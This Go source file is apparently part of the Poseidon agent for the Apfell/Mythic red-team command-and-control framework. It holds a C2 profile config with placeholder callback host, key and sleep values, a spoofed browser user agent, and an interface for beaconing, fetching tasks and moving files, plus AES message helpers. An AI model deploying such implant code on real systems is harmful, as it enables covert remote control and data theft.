package profiles

import (
	"encoding/base64"
	"math/rand"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var PConfig = structs.Mainconfig{
	"UUID_REPLACE",
	false,
	"AESPSK_REPLACE",
	"http(s)://callback_host:callback_port/",
	[]string{},
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3",
	"SLEEP_REPLACE",
}

var (
	UUID                         = "UUID"
	ExchangeKeyString            = "T"
	AesPSK                       = "AESPSK"
	BaseURL                      = "http(s)://callback_host:callback_port/"
	BaseURLs                     = []string{}
	UserAgent                    = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3" // Change this value
	Sleep                        = 10
	HostHeader                   = "" // Use an empty string if it's not being used
	ApiVersion                   = "1.4"
	seededRand        *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
)

const (
	//CheckInMsg - Messages for apfell
	CheckInMsg = 0
	//EKE - Messages for apfell EKE AES
	EKE = 1
	//AES - Messages for apfell static AES
	AES = 2
	//TaskMsg - Messages for apfell tasks
	TaskMsg = 3
	//ResponseMsg - Messages for apfell task responses
	ResponseMsg = 4
	//FileMsg - Messages for apfell file downloads/uploads
	FileMsg = 5
	// ID Type for UUID
	UUIDType = 6
	// ID Type for ApfellID
	ApfellIDType = 7
	// ID Type for FileID
	FileIDType = 8
	// ID Type for session ID
	SESSIDType = 9
	// ID Type for Task ID
	TASKIDType = 10
)

//Profile - Primary interface for apfell C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn(ip string, pid int, user string, host string) interface{}
	// GetTasking method for retrieving the next task from apfell
	GetTasking() interface{}
	// Post a task response to the server
	PostResponse(task structs.Task, output string) []byte
	// Start EKE key negotiation for encrypted comms
	NegotiateKey() string
	// C2 profile implementation for downloading files
	SendFile(task structs.Task, params string)
	// C2 Profile implementation to get a file with specified id
	GetFile(fileid string) []byte
	// C2 profile helper function to send file chunks for file downloads and screenshots
	SendFileChunks(task structs.Task, data []byte)
	C2Commands() []string
	SetC2Commands(commands []string)
}

func NewInstance() interface{} {
	return newProfile()
}

func EncryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
}

func DecryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
	return crypto.AesDecrypt(key, decMsg)
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
	}
	return string(b)
}
